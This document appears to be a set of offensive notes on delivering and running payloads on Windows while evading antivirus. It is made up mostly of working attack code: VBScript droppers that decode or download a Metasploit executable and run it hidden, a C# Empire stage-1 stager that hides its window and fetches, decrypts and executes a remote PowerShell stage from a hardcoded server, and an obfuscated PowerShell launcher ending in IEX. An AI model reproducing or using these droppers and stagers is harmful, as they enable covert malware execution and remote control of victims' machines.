echo shellcode = WScript.Arguments.Item(0):strXML = ^"^^" ^& shellcode ^& ^"^<^/B64DECODE^>^":Set oXMLDoc = CreateObject(^"MSXML2.DOMDocument.3.0^"):oXMLDoc.LoadXML(strXML):decode = oXMLDoc.selectsinglenode(^"B64DECODE^").nodeTypedValue:set oXMLDoc = nothing:Dim fso:Set fso = CreateObject(^"Scripting.FileSystemObject^"):Dim tempdir:Dim basedir:Set tempdir = fso.GetSpecialFolder(2):basedir = tempdir ^& ^"\^" ^& fso.GetTempName():fso.CreateFolder(basedir):tempexe = basedir ^& ^"\^" ^& ^"test.exe^":Dim adodbstream:Set adodbstream = CreateObject(^"ADODB.Stream^"):adodbstream.Type = 1:adodbstream.Open:adodbstream.Write decode:adodbstream.SaveToFile tempexe, 2:Dim wshell:Set wshell = CreateObject(^"Wscript.Shell^"):wshell.run tempexe, 0, true:fso.DeleteFile(tempexe):fso.DeleteFolder(basedir) > %TEMP%\msf.vbs
```

execute metasploit payload with msf.vbs and cscript.exe

```
C:\Documents and Settings\test\Desktop> cscript.exe msf.vbs <msf-vbs-shellcode>
```

![](msf-execute-vbs-payload.png)


## Bypass nc shell buffer size limit

If the script is used in cmd.exe on localhost, everything goes well. But if it is used in netcat cmd shell, the payload will be broken. ex:

```
C:\Documents and Settings\test\Desktop>cscript.exe %TEMP%\msf.vbs TVqQAAMAA.....AAAAAP

Microsoft (R) Windows Script Host Version 5.7
Copyright (C) Microsoft Corporation. All rights reserved.

C:\DOCUME~1\test\LOCALS~1\Temp\msf.vbs(1, 53) Microsoft VBScript compilation error: Syntax error
```

- origin payload size: 6160
- netcat handle payload size: 4068

Pleae try it yourself, For security tests, another vbs script is created.

```
echo strFileURL = WScript.Arguments.Item(0):Set objXMLHTTP = CreateObject(^"MSXML2.XMLHTTP^"):objXMLHTTP.open ^"GET^", strFileURL, false:objXMLHTTP.send():shellcode = objXMLHTTP.responseText:strXML = ^"^<B64DECODE xmlns:dt=^" ^& Chr(34) ^& ^"urn:schemas-microsoft-com:datatypes^" ^& Chr(34) ^& ^" ^" ^& ^"dt:dt=^" ^& Chr(34) ^& ^"bin.base64^" ^& Chr(34) ^& ^"^>^" ^& shellcode ^& ^"^<^/B64DECODE^>^":Set oXMLDoc = CreateObject(^"MSXML2.DOMDocument.3.0^"):oXMLDoc.LoadXML(strXML):decode = oXMLDoc.selectsinglenode(^"B64DECODE^").nodeTypedValue:set oXMLDoc = nothing:Dim fso:Set fso = CreateObject(^"Scripting.FileSystemObject^"):Dim tempdir:Dim basedir:Set tempdir = fso.GetSpecialFolder(2):basedir = tempdir ^& ^"\^" ^& fso.GetTempName():fso.CreateFolder(basedir):tempexe = basedir ^& ^"\^" ^& ^"test.exe^":Dim adodbstream:Set adodbstream = CreateObject(^"ADODB.Stream^"):adodbstream.Type = 1:adodbstream.Open:adodbstream.Write decode:adodbstream.SaveToFile tempexe, 2:Dim wshell:Set wshell = CreateObject(^"Wscript.Shell^"):wshell.run tempexe, 0, true:fso.DeleteFile(tempexe):fso.DeleteFolder(basedir):Set fso = Nothing > %TEMP%\msf.vbs
```

Run the following command to execute your vbs payload:

```
START /B cscript.exe %TEMP%\msf.vbs http://192.168.1.100:8080/payload.txt
```

![](msf-download-execute-vbs-payload.png)


## ByPassAV Empire-PowerShell part 1


```markdown
using System;
using System.Collections.Generic;
using System.Linq;
using System.Management.Automation;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
 
namespace PSEmpire_Stage1
{
    class Program
    {
        // RC4 Class to decrypt the stage 2 data
        // Created by Jeong ChangWook. Source https://gist.github.com/hoiogi/89cf2e9aa99ffc3640a4
        public class RC4
        {
            public static byte[] Encrypt(byte[] pwd, byte[] data)
            {
                int a, i, j, k, tmp;
                int[] key, box;
                byte[] cipher;
 
                key = new int[256];
                box = new int[256];
                cipher = new byte[data.Length];
 
                for (i = 0; i < 256; i++)
                {
                    key[i] = pwd[i % pwd.Length];
                    box[i] = i;
                }
                for (j = i = 0; i < 256; i++)
                {
                    j = (j + box[i] + key[i]) % 256;
                    tmp = box[i];
                    box[i] = box[j];
                    box[j] = tmp;
                }
                for (a = j = i = 0; i < data.Length; i++)
                {
                    a++;
                    a %= 256;
                    j += box[a];
                    j %= 256;
                    tmp = box[a];
                    box[a] = box[j];
                    box[j] = tmp;
                    k = box[((box[a] + box[j]) % 256)];
                    cipher[i] = (byte)(data[i] ^ k);
                }
                return cipher;
            }
 
            public static byte[] Decrypt(byte[] pwd, byte[] data)
            {
                return Encrypt(pwd, data);
            }
 
        }
 
        // Hide Windows function by our friends from StackOverFlow
        // https://stackoverflow.com/questions/34440916/hide-the-console-window-from-a-console-application
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
 
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
        static void Main(string[] args)
        {
            // To Hide the ConsoleWindow (It may be a better way...)
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);
 
            // Avoid sending Expect 100 Header 
            System.Net.ServicePointManager.Expect100Continue = false;
 
            // Create a WebClient Object (No Proxy Support Included)
            WebClient wc = new WebClient();
            string ua = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
            wc.Headers["User-Agent"] = ua;
            wc.Headers["Cookie"] = "session=968PH6bE9CDkwYGfsUPraz0x5PQ=";
 
            // Set the Server Address and URL 
            string server = "http://192.168.6.119:8081";
            string target = "/CWoNaJLBo/VTNeWw11212/";
 
            // Download The Data or Stage 2
            byte[] data = wc.DownloadData(server + target);
 
            // Extract IV
            byte[] iv = data.Take(4).Select(i => i).ToArray();
 
            // Remove the IV from the data
            byte[] data_noIV = data.Skip(4).ToArray();
 
            // Set Key value for decryption. PowerEmpire StageingKey value 
            string key = "fdcece0a22c10f83dccc8f17c95a33d4";
            byte[] K = Encoding.ASCII.GetBytes(key);
 
            // Combine the IV + Key (New random key each time)
            byte[] IVK = new byte[iv.Length + K.Length];
            iv.CopyTo(IVK, 0);
            K.CopyTo(IVK, iv.Length);
 
            // Decrypt the Message
            byte[] decrypted = RC4.Decrypt(IVK, data_noIV);
 
            // Convert the stage2 decrypted message from bytes to ASCII
            string stage2 = System.Text.Encoding.ASCII.GetString(decrypted);
 
            // Create a PowerShell Object to execute the command 
            PowerShell PowerShellInstance = PowerShell.Create();
 
            // Create the variables $ser and $u which are part of the downloaded stage2
            PowerShellInstance.Runspace.SessionStateProxy.SetVariable("ser", server);
            PowerShellInstance.Runspace.SessionStateProxy.SetVariable("u", ua);
 
            // Add the Script Stage 2 to the Powershell Object
            PowerShellInstance.AddScript(stage2);
 
            // Execute the Script!
            PowerShellInstance.Invoke();
 
        }
    }
}
```

compile:

`csc.exe PSEmpireStage1.cs /reference:C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll`


For more details see [video](https://www.youtube.com/watch?v=0jaC8156BEE)

## ByPassAV Empire-PowerShell part 2

[360 fud](https://blog.flanker017.me/testing-empire-as-post-exploitation-framework-in-domain-environment)

```markdown

"[SYsTem.NET.SErvIcePOInTMANAgER]::EXPecT100CONtiNuE=0;$WC=NEW-OBjECT SYstem.NeT.WEBCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)
like Gecko';$WC.HeAdErS.Add('User-Agent',$u);$WC.PRoxY= [SYStem.NEt.WEbREqUEsT]::DEfaulTWEBPrOxY;$WC.ProxY.CreDEnTials = [SySTEm.NET.CreDenTIalCache]::DeFAUltNETWOrkCReDentIALs;$Script:Proxy = $wc.Proxy;$K= [SYStEm.TeXT.ENCodiNG]::ASCII.GEtBytES('JV+~fgh!GFWZ8=eiEN{[#}&x_XLtHKT7');$R= {$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J-(-$S[$_])- (-$K[$_%$K.CoUnt]))%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H= ($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_- bXoR$S[($S[$I]+$S[$H])%256]}};$ser='http://172.16.3.77:80';$t='/news.php';$Wc.HEaDERs.AD joIN[ChAr[]](& $R $datA ($IV+$K))|IEX"

```

[fully-undetectable-backdooring-pe-file](https://haiderm.com/fully-undetectable-backdooring-pe-file/)

[PowerEmpire-Stage-1-to-CSharp](https://plaintext.do/AV-Evasion-Converting-PowerEmpire-Stage-1-to-CSharp-EN/)

